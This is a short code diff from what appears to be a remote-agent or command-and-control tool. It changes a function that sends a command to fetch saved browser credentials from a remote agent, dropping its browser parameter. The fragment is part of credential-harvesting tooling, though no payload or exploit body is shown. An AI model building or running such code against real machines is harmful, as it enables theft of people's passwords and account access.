@@ -10,8 +10,8 @@ async def remote_send_command_task(ctx, agent_id: str, command: str, _action_nam
     return result.model_dump()
 
 
-async def remote_send_web_cred_gather(ctx, agent_id: str, cred_type: CredentialType, browser:str):
-    command = GenAction(action=CommandIdentifiers.FETCH_WEB_BROSER_CREDENTIALS, browser=browser, cred_type=cred_type.value).xml()
+async def remote_send_web_cred_gather(ctx, agent_id: str, cred_type: CredentialType):
+    command = GenAction(action=CommandIdentifiers.FETCH_WEB_BROSER_CREDENTIALS, cred_type=cred_type.value).xml()
     result = await remote_send_command(conn_id=agent_id, command=command)
     if not result.success:
         raise Exception(result.error)
